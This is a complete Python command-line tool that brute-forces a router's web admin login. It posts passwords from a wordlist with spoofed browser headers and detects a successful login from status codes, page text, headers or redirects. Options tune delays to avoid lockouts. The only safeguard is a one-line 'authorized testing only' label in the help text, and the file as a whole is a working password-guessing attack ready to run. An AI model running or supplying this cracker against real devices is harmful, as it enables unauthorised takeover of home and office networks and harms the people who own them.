import requests
import sys
import time
import argparse
import logging
import re

def crack_router(router_url, username, password_file,
                 timeout: float = 10.0,
                 delay: float = 0.0,
                 success_indicators=None,
                 success_status_codes=None,
                 success_headers: dict = None,
                 failed_log_file: str = "failed_attempts.txt"):
    # ANSI Color Codes for terminal output
    GREEN = '\033[92m'
    RED = '\033[91m'
    RESET = '\033[0m'
    YELLOW = '\033[93m'

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'http://192.168.0.1',
        'Referer': 'http://192.168.0.1/login.htm'
    }

    attempt_count = 0
    start_time = time.time()

    # Normalize defaults
    if success_indicators is None:
        success_indicators = ["index.htm", "dashboard"]
    success_indicators = [s.lower() for s in success_indicators]

    if success_status_codes is None:
        success_status_codes = [200]

    if success_headers is None:
        success_headers = {}

    try:
        with open(password_file, 'r', encoding='utf-8') as f:
            for password in f:
                password = password.strip()
                if not password:
                    continue
                attempt_count += 1

                payload = {
                    'username': username,
                    'password': password
                }

                # Handle network errors per-attempt so a single failure doesn't abort the whole run
                try:
                    response = requests.post(router_url, data=payload, headers=headers, timeout=timeout)
                except requests.RequestException as e:
                    logging.warning("Request failed for attempt %d: %s", attempt_count, e)
                    with open(failed_log_file, 'a', encoding='utf-8') as log:
                        log.write(password + "\n")
                    if delay:
                        time.sleep(delay)
                    continue

                # Router-specific success checks
                # Consider success in two ways:
                # A) Status code alone indicates success (e.g., 302 redirect to admin)
                if response.status_code in success_status_codes:
                    logging.info("Password found by status code: %s (status=%s)", password, response.status_code)
                    return password

                # B) Body + header match: body contains any indicator AND provided header substrings (if any) match
                body = response.text or ""
                lower = body.lower()
                body_ok = any(ind in lower for ind in success_indicators)

                header_ok = True
                if success_headers:
                    header_ok = False
                    for hname, hsub in success_headers.items():
                        val = response.headers.get(hname, "").lower()
                        if hsub.lower() in val:
                            header_ok = True
                        else:
                            header_ok = False
                            break

                if body_ok and header_ok:
                    logging.info("Password found by body/header match: %s", password)
                    return password

                # Check redirect Location header for indicators as fallback
                loc = response.headers.get('Location', '')
                if loc and any(ind in loc.lower() for ind in success_indicators):
                    logging.info("Password found via redirect: %s", password)
                    return password

                # Not a success — log and persist failed attempt
                logging.debug("Attempt %d failed: %s (status=%s)", attempt_count, password, getattr(response, 'status_code', None))
                with open(failed_log_file, 'a', encoding='utf-8') as log:
                    log.write(password + "\n")

                # Respect configured delay between attempts to reduce lockouts
                if delay:
                    time.sleep(delay)
    except Exception as e:
        logging.error("Unexpected error during cracking: %s", e)
    finally:
        elapsed = time.time() - start_time
        logging.info("Attempts: %d, Elapsed: %.2fs", attempt_count, elapsed)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simple router password cracker (for authorized testing only)")
    parser.add_argument("router_url", help="Router login URL, e.g. http://192.168.0.1/login.htm")
    parser.add_argument("username", help="Username to try")
    parser.add_argument("password_file", help="File containing candidate passwords, one per line")
    parser.add_argument("--delay", type=float, default=0.0, help="Delay (seconds) between attempts to reduce lockouts (default: 0)")
    parser.add_argument("--timeout", type=float, default=10.0, help="Per-request timeout seconds (default: 10)")
    parser.add_argument("--success", nargs="*", default=["index.htm", "dashboard"],
                        help="Additional success indicators to search for in response body (case-insensitive)."
                             " Default: index.htm dashboard")
    parser.add_argument("--log", default=None, help="Path to log file; if provided, logs will also be written to this file")
    parser.add_argument("--failed-log", default="failed_attempts.txt", help="Path to write failed attempts (default: failed_attempts.txt)")
    parser.add_argument("--success-header", action='append', default=[],
                        help="Header match in form 'Header-Name:substring'. Can be repeated. If provided, header substring must be present to count as body/header match.")
    parser.add_argument("--success-status-codes", default="200",
                        help="Comma- or space-separated list of HTTP status codes to treat as immediate success (default: 200). Example: --success-status-codes 200,302")
    parser.add_argument("--verbose", action="store_true", help="Enable debug logging")

    args = parser.parse_args()

    # Configure logging
    log_level = logging.DEBUG if args.verbose else logging.INFO
    handlers = [logging.StreamHandler()]
    if args.log:
        handlers.append(logging.FileHandler(args.log))
    logging.basicConfig(level=log_level, format="%(asctime)s %(levelname)s: %(message)s", handlers=handlers)

    # Prepare inputs for crack_router
    success_indicators = args.success
    timeout = args.timeout
    delay = args.delay
    failed_log_file = args.failed_log

    # Parse success headers passed as --success-header 'Name:substr'
    success_headers = {}
    for item in args.success_header:
        if ':' in item:
            name, substr = item.split(':', 1)
            success_headers[name.strip()] = substr.strip()
        else:
            logging.warning("Ignoring malformed --success-header entry: %s", item)

    # Parse status codes (comma or space separated)
    codes_raw = re.split(r'[,\s]+', args.success_status_codes.strip()) if args.success_status_codes else []
    success_status_codes = []
    for c in codes_raw:
        if c:
            try:
                success_status_codes.append(int(c))
            except ValueError:
                logging.warning('Ignoring invalid status code: %s', c)

    if not success_status_codes:
        success_status_codes = [200]

    found = crack_router(args.router_url, args.username, args.password_file,
                         timeout=timeout,
                         delay=delay,
                         success_indicators=success_indicators,
                         success_status_codes=success_status_codes,
                         success_headers=success_headers,
                         failed_log_file=failed_log_file)

    if found:
        logging.info("Password found: %s", found)
        sys.exit(0)
    else:
        logging.info("Password not found in provided wordlist")
        sys.exit(2)